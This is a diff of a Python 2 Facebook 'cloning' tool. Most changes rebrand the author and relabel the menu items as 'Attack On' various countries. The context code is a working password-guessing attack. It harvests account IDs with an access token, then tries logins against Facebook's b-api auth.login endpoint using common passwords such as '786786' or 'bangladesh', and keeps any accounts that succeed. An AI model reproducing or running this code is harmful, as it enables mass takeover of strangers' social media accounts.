@@ -1,8 +1,8 @@
 #!/usr/bin/python2
 #coding=utf-8
-#TECH ABM THE OFFICAL ROGRAMMER 
+#TECH ARBAB ALI
 #FBCLONING COMMMAD MAKER 
-#YOUTUBE TECH ABM
+#YOUTUBE CYBER GANGE HIDDEN TRICKER
 
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
@@ -65,9 +65,9 @@ logo = """
 \033[1;95m  | | | |___| \__/\| | | | | | | || |_/ / |  | |
 \033[1;97m  \_/ \____/ \____/\_| |_/ \_| |_/\____/\_|  |_/
 \033[1;97m>>============================================
-\033[1;97m>> \033[1;95mAuthor \033[1;91m: \033[1;93mTech | Abm
-\033[1;97m>> \033[1;95mGithub \033[1;91m: \033[1;93mhttps://github.com/Tech-abm 
-\033[1;97m>> \033[1;95mFb Page \033[1;91m: \033[1;93mhttps://m.facebook.com/Techabm
+\033[1;97m>> \033[1;95mAuthor \033[1;91m: \033[1;93mCyber-Hacker | Arbab Ali
+\033[1;97m>> \033[1;95mNoted \033[1;91m: \033[1;93mInstall free Vpn Before login in Pak
+\033[1;97m>> \033[1;95mContact \033[1;91m: \033[1;93mhttps://m.facebook.com/Techabm
 \033[1;97m>>============================================
 """
 
@@ -141,7 +141,7 @@ def login():
 	time.sleep(0.05)
 	print "\033[1;91m[5]\033[1;93m Download Kiwi Browser \033[1;97m(\033[1;91mUrl\033[1;97m)"
 	time.sleep(0.05)
-	print "\033[1;91m[6]\033[1;94m Update Tech Abm Command \033[1;97m(\033[1;91mGithub\033[1;97m) "
+	print "\033[1;91m[6]\033[1;94m Update Arbab Ali Commond \033[1;97m(\033[1;91mGithub\033[1;97m) "
 	time.sleep(0.05)
 	print "\033[1;91m[7]\033[1;93m Follow me fb page \033[1;97m(\033[1;91mTech Abm\033[1;97m) "
 	time.sleep(0.05)
@@ -168,10 +168,10 @@ def pilih_login():
 	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.kiwibrowser.browser')
 	        login()
 	elif peak =="6": 
-	        os.system('xdg-open https://github.com/Tech-abm ')
+	        os.system('xdg-open https://github.com/TheArbsb ')
 	        login()
 	elif peak =="7": 
-	        os.system('xdg-open https://m.facebook.com/Techabm')
+	        os.system('xdg-open https://m.facebook.com/ArbabMemon')
 	        login()
 	elif unikers =="0":
 		jalan('Token Removed')
@@ -297,31 +297,31 @@ def menu():
 	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
 	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
 	print "\033[1;97m «--------------------------------------------»"
-	print "\033[1;32;98m[1] \033[1;91m>> \033[1;93mstart Cloning Pakistan \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
+	print "\033[1;32;98m[1] \033[1;91m>> \033[1;93mStart Attack On Pakistan \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
-	print "\033[1;32;98m[2] \033[1;91m>> \033[1;96mstart Cloning India \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
+	print "\033[1;32;98m[2] \033[1;91m>> \033[1;96mStart Attack On India \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
-        print "\033[1;32;98m[3] \033[1;91m>> \033[1;93mstart Cloning Bangladesh \033[1;97m(\033[1;91mTech Abm\033[1;97m) " 
+        print "\033[1;32;98m[3] \033[1;91m>> \033[1;93mStart Attack On Bangladesh \033[1;97m(\033[1;91mTech Abm\033[1;97m) " 
         time.sleep(0.05)
-        print "\033[1;32;98m[4] \033[1;91m>> \033[1;96mstart Cloning Indonesia \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
+        print "\033[1;32;98m[4] \033[1;91m>> \033[1;96mStart Attack On Indonesia \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
-        print "\033[1;32;98m[5] \033[1;91m>> \033[1;93mstart Cloning Usa \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
+        print "\033[1;32;98m[5] \033[1;91m>> \033[1;93mStart Attsck On America(USA)\033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
-        print "\033[1;32;98m[6] \033[1;91m>> \033[1;96mstart Cloning Denmark \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
+        print "\033[1;32;98m[6] \033[1;91m>> \033[1;96mStart Attack On Denmark \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
-        print "\033[1;32;98m[7] \033[1;91m>> \033[1;93mstart Cloning Japan \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
+        print "\033[1;32;98m[7] \033[1;91m>> \033[1;93mStart Attack On Japan \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
         print "\033[1;32;98m[8] \033[1;91m>> \033[1;96mstart Target Hacking \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
-        print "\033[1;32;98m[9] \033[1;91m>> \033[1;93mstart Cloning China \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
+        print "\033[1;32;98m[9] \033[1;91m>> \033[1;93mStart Attack On China \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
-        print "\033[1;32;98m[10] \033[1;91m>> \033[1;96mstart Cloning From Posts \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
+        print "\033[1;32;98m[10] \033[1;91m>> \033[1;96mStart Cloning From Posts \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
         print "\033[1;32;98m[11] \033[1;91m>> \033[1;93mTools Reset And Update \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
         print "\033[1;32;98m[12] \033[1;91m>> \033[1;96mStar Cloning Testing \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
-        print "\033[1;32;98m[13] \033[1;91m>> \033[1;93mStar Cloning Abm Tools \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
+        print "\033[1;32;98m[13] \033[1;91m>> \033[1;93mStar Cloning Arbab Tools \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
         print "\033[1;32;98m[14] \033[1;91m>> \033[1;96mStar Cloning email from ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)" 
         time.sleep(0.05)
@@ -411,9 +411,9 @@ def super():
 	os.system('clear')
 	print logo
         print "\033[1;97m «--------------------------------------------»"
-        print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
+        print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mArbab Ali\033[1;97m)") 
 	time.sleep(0.05)
-	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
+	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mArbab Ali\033[1;97m)") 
 	time.sleep(0.05)
 	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
 	print "\033[1;97m «--------------------------------------------»"
@@ -602,9 +602,9 @@ def mafiax():
 	os.system('clear')
 	print logo
         print "\033[1;97m «--------------------------------------------»" 
-	print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
+	print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mArbab Ali\033[1;97m)") 
 	time.sleep(0.05)
-	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
+	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mArbab Ali\033[1;97m)") 
 	time.sleep(0.05)
 	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
 	print "\033[1;97m «--------------------------------------------»"
@@ -656,7 +656,7 @@ def pilih_mafiax():
 	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m «--------------------------------------------»"
 	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;91m            Create By : Tech-Abm')
+        jalan(' \033[1;91m            Create By : Arbab Ali Memon')
 	print "\033[1;97m «--------------------------------------------»"
 
 	def main(arg):
@@ -793,9 +793,9 @@ def pakarmy():
 	os.system('clear')
 	print logo
         print "\033[1;97m «--------------------------------------------»"
-	print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
+	print( "\x1b[1;32;92m[1] \033[1;33;93m>> Crack From Friendlist \033[1;97m(\033[1;91mArbab Ali\033[1;97m)") 
 	time.sleep(0.05)
-	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mTech Abm\033[1;97m)") 
+	print( "\x1b[1;32;92m[2] \033[1;33;98m>> Crack From Public ID \033[1;97m(\033[1;91mArbab Ali\033[1;97m)") 
 	time.sleep(0.05)
 	print( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
 	print "\033[1;97m «--------------------------------------------»"
@@ -847,7 +847,7 @@ def pilih_pakarmy():
 	print "\n\033[1;97m  «-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m «--------------------------------------------»"
 	jalan('   \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;91m            Create By : Tech-Abm')
+        jalan(' \033[1;91m            Create By : Arbab Ali')
 	print "\033[1;97m «--------------------------------------------»"
 
 	def main(arg):
@@ -860,7 +860,7 @@ def pilih_pakarmy():
 		try:													
 			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			y = json.loads(k.text)
-			pass1 = ('786786')
+			pass1 = ('bangladesh')
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			s = json.load(data)
 			if 'access_token' in s:
